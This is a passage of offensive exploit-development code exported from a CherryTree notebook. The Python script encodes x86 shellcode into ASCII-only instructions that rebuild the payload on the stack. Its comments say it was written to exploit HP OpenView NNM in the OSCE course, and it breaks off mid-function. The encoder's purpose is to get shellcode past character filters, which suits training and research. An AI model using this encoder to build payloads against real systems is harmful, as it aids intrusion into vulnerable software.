<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ASCII</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">ASCII</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Shellcode&nbsp;to&nbsp;ASCII&nbsp;encoder&nbsp;leveraging&nbsp;rebuilding&nbsp;on-the-stack&nbsp;technique,</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;and&nbsp;using&nbsp;Jon&nbsp;Erickson's&nbsp;algorithm&nbsp;from&nbsp;Phiral&nbsp;Research&nbsp;Labs&nbsp;`Dissembler`&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;utility&nbsp;(as&nbsp;described&nbsp;in:&nbsp;Hacking&nbsp;-&nbsp;The&nbsp;Art&nbsp;of&nbsp;Exploitation).</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Basically&nbsp;one&nbsp;gives&nbsp;to&nbsp;the&nbsp;program's&nbsp;output&nbsp;a&nbsp;binary&nbsp;encoded&nbsp;shellcode,</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;and&nbsp;it&nbsp;yields&nbsp;on&nbsp;the&nbsp;output&nbsp;it's&nbsp;ASCII&nbsp;encoded&nbsp;form.</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;This&nbsp;payload&nbsp;will&nbsp;at&nbsp;the&nbsp;beginning&nbsp;align&nbsp;the&nbsp;stack&nbsp;by&nbsp;firstly&nbsp;moving&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;ESP&nbsp;value&nbsp;to&nbsp;the&nbsp;EAX,&nbsp;then&nbsp;by&nbsp;adding&nbsp;to&nbsp;the&nbsp;EAX&nbsp;value&nbsp;0x16CA&nbsp;then&nbsp;by</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;setting&nbsp;ESP&nbsp;with&nbsp;such&nbsp;resulted&nbsp;EAX.&nbsp;It&nbsp;means&nbsp;that&nbsp;the&nbsp;final&nbsp;decoded&nbsp;shellcode</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;will&nbsp;get&nbsp;stored&nbsp;in&nbsp;the&nbsp;stack,&nbsp;by&nbsp;0x16CA&nbsp;bytes&nbsp;away&nbsp;from&nbsp;current&nbsp;stack&nbsp;address.</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Obviously,&nbsp;this&nbsp;encoder&nbsp;will&nbsp;not&nbsp;be&nbsp;working&nbsp;under&nbsp;DEP/W^X&nbsp;environments.</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Written&nbsp;for&nbsp;HP&nbsp;OpenView&nbsp;NNM&nbsp;exploitation&nbsp;purpose,&nbsp;during&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Offensive-Security&nbsp;CTP&nbsp;/&nbsp;OSCE&nbsp;course.</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Source:</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;https://gist.github.com/mgeeky/8a118c69312b35a9db7f19f61c7a6b3c</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Mariusz&nbsp;B.&nbsp;/&nbsp;mgeeky,&nbsp;'17</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;random<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;ctypes<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;================================================</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;OPTIONS</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;================================================</span><br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Characters&nbsp;that&nbsp;are&nbsp;safe&nbsp;to&nbsp;use&nbsp;in&nbsp;encoded&nbsp;payload.</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;VALID_CHARS&nbsp;=&nbsp;"01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-*\\%"</span><br />VALID_CHARS&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x2a\x25\x2d\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span><br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Be&nbsp;more&nbsp;verbose.</span><br />DEBUG&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Set&nbsp;it&nbsp;to&nbsp;True&nbsp;in&nbsp;order&nbsp;to&nbsp;always&nbsp;prepend&nbsp;ZERO-EAX&nbsp;primitive&nbsp;before</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;sequence&nbsp;of&nbsp;SUB&nbsp;operations.&nbsp;The&nbsp;`gen`&nbsp;routine&nbsp;will&nbsp;then&nbsp;operate&nbsp;on&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;previous&nbsp;value&nbsp;being&nbsp;always&nbsp;0x00000000&nbsp;instead&nbsp;of&nbsp;previously&nbsp;held&nbsp;in&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;EAX&nbsp;value.&nbsp;The&nbsp;side&nbsp;effect&nbsp;of&nbsp;this&nbsp;setting&nbsp;is&nbsp;increased&nbsp;payload&nbsp;length.</span><br />PREPEND_ZERO_OUT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br /><br />PREPEND_INIT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;================================================</span><br /><br />MAX_NUM&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">128</span><br /><br />primitives&nbsp;=&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Zeros-out&nbsp;the&nbsp;EAX&nbsp;register</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;25&nbsp;4a4f4e45&nbsp;&nbsp;&nbsp;AND&nbsp;EAX,454e4f4a</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;25&nbsp;3530313a&nbsp;&nbsp;&nbsp;AND&nbsp;EAX,3a313035</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#'zero-eax'&nbsp;:&nbsp;'%JONE%501:',</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Zeros-out&nbsp;the&nbsp;EAX&nbsp;register</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;25&nbsp;4A4D4E55&nbsp;AND&nbsp;EAX,554E4D4A</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;25&nbsp;3532312A&nbsp;AND&nbsp;EAX,2A313235</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'zero-eax'</span>:&nbsp;<span style="color:#3ad900;font-weight:400">'%JMNU%521*'</span>,<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Aligns&nbsp;a&nbsp;stack&nbsp;address&nbsp;that&nbsp;the&nbsp;EAX&nbsp;will&nbsp;take,&nbsp;by&nbsp;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;adding&nbsp;value&nbsp;of&nbsp;0x1688&nbsp;to&nbsp;the&nbsp;EAX&nbsp;register</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;2D&nbsp;41373737&nbsp;&nbsp;&nbsp;SUB&nbsp;EAX,&nbsp;37373741</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;2D&nbsp;69252525&nbsp;&nbsp;&nbsp;SUB&nbsp;EAX,&nbsp;25252569</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;2D&nbsp;72324949&nbsp;&nbsp;&nbsp;SUB&nbsp;EAX,&nbsp;49493272</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;2D&nbsp;5C5A5A5A&nbsp;&nbsp;&nbsp;SUB&nbsp;EAX,&nbsp;5A5A5A5C</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'eax-stack-align'</span>&nbsp;:&nbsp;<span style="color:#3ad900;font-weight:400">'-A777-i%%%-r2II-\\ZZZ'</span>,<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Sets&nbsp;ESP&nbsp;(stack&nbsp;pointer)&nbsp;to&nbsp;EAX</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PUSH&nbsp;EAX</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;5c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;POP&nbsp;ESP</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'set-esp-to-eax'</span>&nbsp;:&nbsp;<span style="color:#3ad900;font-weight:400">'P\\'</span>,<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Sets&nbsp;EAX&nbsp;to&nbsp;ESP</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;54&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PUSH&nbsp;ESP</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;POP&nbsp;EAX</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'set-eax-to-esp'</span>&nbsp;:&nbsp;<span style="color:#3ad900;font-weight:400">'TX'</span>,<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;ASCII&nbsp;friendly&nbsp;NOP&nbsp;equivalent</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;47&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INC&nbsp;EDI</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'nop'</span>&nbsp;:&nbsp;<span style="color:#3ad900;font-weight:400">'G'</span>,<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Stores&nbsp;resulted&nbsp;EAX&nbsp;value&nbsp;on&nbsp;the&nbsp;stack</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PUSH&nbsp;EAX</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'store-on-stack'</span>&nbsp;:&nbsp;<span style="color:#3ad900;font-weight:400">'P'</span>,<br />}<br /><br /><span style="color:#ff9d00;font-weight:700">class</span>&nbsp;InvalidCharResulted(<span style="color:#7f0044;font-weight:400">Exception</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">pass</span><br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;dbg(x,&nbsp;raw&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;DEBUG:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;raw:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;x<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[dbg]&nbsp;'</span>&nbsp;+&nbsp;x<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;compose(num):<br />&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;|=&nbsp;num[<span style="color:#ff0044;font-weight:400">3</span>]&nbsp;&lt;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">24</span><br />&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;|=&nbsp;num[<span style="color:#ff0044;font-weight:400">2</span>]&nbsp;&lt;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">16</span><br />&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;|=&nbsp;num[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;&lt;&lt;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">8</span><br />&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;|=&nbsp;num[<span style="color:#ff0044;font-weight:400">0</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;ret<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;decompose(num):<br />&nbsp;&nbsp;&nbsp;&nbsp;decompose&nbsp;=&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;decompose[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;=&nbsp;(num&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0x000000ff</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;decompose[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;=&nbsp;(num&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0x0000ff00</span>)&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">8</span><br />&nbsp;&nbsp;&nbsp;&nbsp;decompose[<span style="color:#ff0044;font-weight:400">2</span>]&nbsp;=&nbsp;(num&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0x00ff0000</span>)&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">16</span><br />&nbsp;&nbsp;&nbsp;&nbsp;decompose[<span style="color:#ff0044;font-weight:400">3</span>]&nbsp;=&nbsp;(num&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0xff000000</span>)&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">24</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;decompose<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;strfry(item):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join([<span style="color:#ff9d00;font-weight:700">str</span>(w)&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;w&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;random.sample(item,&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(item))])<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;strfrylist(item):<br />&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">list</span>(item)<br />&nbsp;&nbsp;&nbsp;&nbsp;random.shuffle(x)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;x<br /><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Original&nbsp;algorithm&nbsp;designed&nbsp;by&nbsp;Jon&nbsp;Erickson,&nbsp;&lt;matrix@phiral.com&gt;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Heavily&nbsp;modified&nbsp;by&nbsp;the&nbsp;author&nbsp;of&nbsp;this&nbsp;program.</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;gen(dword,&nbsp;prev,&nbsp;alphabet):<br />&nbsp;&nbsp;&nbsp;&nbsp;chrs_len&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(alphabet)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;t&nbsp;=&nbsp;decompose(dword)<br />&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;decompose(prev)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(MAX_NUM)]<br />&nbsp;&nbsp;&nbsp;&nbsp;q&nbsp;=&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(MAX_NUM)]<br />&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(MAX_NUM)]<br />&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(MAX_NUM)]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Initializing&nbsp;index&nbsp;tables</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;a&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(chrs_len):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p[a]&nbsp;=&nbsp;q[a]&nbsp;=&nbsp;r[a]&nbsp;=&nbsp;s[a]&nbsp;=&nbsp;a&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Shuffling&nbsp;index&nbsp;tables</span><br />&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;strfrylist(p)<br />&nbsp;&nbsp;&nbsp;&nbsp;q&nbsp;=&nbsp;strfrylist(q)<br />&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;strfrylist(r)<br />&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;strfrylist(s)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#pr&nbsp;=&nbsp;strfrylist(list(alphabet[:20]))</span><br />&nbsp;&nbsp;&nbsp;&nbsp;pr&nbsp;=&nbsp;[<span style="color:#ff9d00;font-weight:700">chr</span>(<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">20</span>)]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Coefficients&nbsp;=&nbsp;subsequent&nbsp;bytes&nbsp;forming&nbsp;a&nbsp;DWORDs&nbsp;that&nbsp;will&nbsp;be</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;used&nbsp;as&nbsp;arguments&nbsp;in&nbsp;SUB&nbsp;operations.&nbsp;coeffs[0]&nbsp;stands&nbsp;for&nbsp;the&nbsp;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;first&nbsp;SUB's&nbsp;argument,&nbsp;coeffs[1]&nbsp;for&nbsp;the&nbsp;second&nbsp;SUB's&nbsp;argument&nbsp;and&nbsp;so&nbsp;on.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;coeffs&nbsp;=&nbsp;[<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>],<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>],<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>],<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;0x2D&nbsp;-&nbsp;SUB&nbsp;opcode.&nbsp;Here&nbsp;we&nbsp;construct&nbsp;a&nbsp;template:</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;[&nbsp;...,&nbsp;0x2d,&nbsp;AA,&nbsp;BB,&nbsp;CC,&nbsp;DD,&nbsp;...]&nbsp;where&nbsp;AA,BB,CC,DD&nbsp;will&nbsp;be&nbsp;argument</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;bytes&nbsp;to&nbsp;fill&nbsp;in.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;pr[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;=&nbsp;pr[<span style="color:#ff0044;font-weight:400">5</span>]&nbsp;=&nbsp;pr[<span style="color:#ff0044;font-weight:400">10</span>]&nbsp;=&nbsp;pr[<span style="color:#ff0044;font-weight:400">15</span>]&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">chr</span>(<span style="color:#ff0044;font-weight:400">0x2D</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Construct&nbsp;from&nbsp;1&nbsp;to&nbsp;5&nbsp;at&nbsp;max&nbsp;consecutive&nbsp;SUB&nbsp;operations</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;a&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">5</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;carry&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag&nbsp;=&nbsp;[<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Iterate&nbsp;over&nbsp;bytes&nbsp;0...3&nbsp;composing&nbsp;full&nbsp;32-bit&nbsp;DWORD</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;z&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">4</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loop_next&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Iterate&nbsp;over&nbsp;possible&nbsp;indexes&nbsp;of&nbsp;the&nbsp;first&nbsp;byte&nbsp;within&nbsp;argument</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(chrs_len):<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Iterate&nbsp;over&nbsp;possible&nbsp;indexes&nbsp;of&nbsp;the&nbsp;second&nbsp;byte&nbsp;within&nbsp;argument</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;j&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(chrs_len):<br 